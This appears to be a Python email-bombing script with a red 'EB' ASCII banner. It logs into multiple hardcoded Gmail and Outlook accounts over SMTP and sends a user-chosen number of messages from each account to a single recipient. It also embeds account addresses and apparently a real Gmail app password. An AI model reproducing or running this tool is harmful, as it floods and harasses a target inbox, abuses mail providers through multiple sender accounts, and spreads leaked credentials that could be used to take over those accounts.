import os
import smtplib
from smtplib import SMTPAuthenticationError
import sys
import time
import random

# Konfiguration der Absenderinformationen
senders_info = {
    'gmail': [
        ('kakaoilskin@gmail.com', 'password123'),
        ('anonymous.polandd@gmail.com', 'putt dnrg vlal bcls'),
    ],
    'outlook': [
        ('example1@outlook.com', 'password1'),
    ],
}

def clear_screen():
    os.system('clear')

ART = """ ________  _______
/        |/       \ 
$$$$$$$$/ $$$$$$$  |
$$ |__    $$ |__$$ |
$$    |   $$    $$< 
$$$$$/    $$$$$$$  |
$$ |_____ $$ |__$$ |
$$       |$$    $$/ 
$$$$$$$$/ $$$$$$$/
"""

def print_ascii_art(art):
    RED = '\033[91m'
    END = '\033[0m'
    print(f"{RED}{art}{END}")

BLUE = '\033[94m'
RED = '\033[91m'
WHITE = '\033[97m'
END = '\033[0m'

def get_non_negative_integer(prompt):
    while True:
        try:
            print(f"{BLUE}{prompt}{END}", end='')
            value = input()
            return int(value)
        except ValueError:
            print(f"{RED}Invalid input. Please enter a number.{END}")

def get_non_empty_input(prompt):
    while True:
        print(f"{BLUE}{prompt}{END}", end='')
        value = input().strip()
        if value:
            return value

def show_menu():
    print_ascii_art(ART)
    print(f"{BLUE}Select Email Service:{END}")
    print(f"{RED}[1] Gmail")
    print(f"[2] Outlook")
    print(f"[3] Other{END}")

def select_email_service():
    while True:
        clear_screen()
        show_menu()
        choice = input(f"{BLUE}Mail Server: {END}").strip()
        if choice == '1':
            return 'gmail'
        elif choice == '2' or choice == '3':
            return 'outlook'
        else:
            print(f"{RED}Invalid selection. Please enter 1, 2, or 3.{END}")

email_service = select_email_service()

if email_service == 'gmail':
    smtp_server = 'smtp.gmail.com'
    smtp_port = 587
else: 
    smtp_server = 'smtp.office365.com'
    smtp_port = 587

recipient_email = get_non_empty_input("Recipient's email: ")
recipient_name = get_non_empty_input("Recipient's name: ")
sender_alias = get_non_empty_input("Sender alias: ")
number_of_emails_per_account = get_non_negative_integer("Number of emails per account: ")
delay = get_non_negative_integer("Delay (in seconds) between emails: ")
message_body = get_non_empty_input("Email message content: ")

for sender_email, sender_password in senders_info[email_service]:
    email_counter = 1
    print(f"{RED}Sending from {sender_email}{END}")
    
    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.ehlo()
            server.starttls()
            server.ehlo()
            try:
                server.login(sender_email, sender_password)
                print(f"{RED}Login successful.{END}")
            except SMTPAuthenticationError:
                print(f"{RED}Login failed for {sender_email}.{END}")
                continue

            for _ in range(number_of_emails_per_account):
                subject_line = f"Custom Email - {email_counter}"
                customized_message = f"""From: {sender_email}
To: {recipient_email}
Subject: {subject_line}

Hello {recipient_name}!

{message_body}

Warm regards,
{sender_alias}
"""
                server.sendmail(sender_email, recipient_email, customized_message.encode('utf-8'))
                print(f"{RED}Email {email_counter} sent to {recipient_email}.{END}")
                time.sleep(delay)
                email_counter += 1

    except Exception as e:
        print(f"Error: {e}")

print(f"{RED}Process completed.{END}")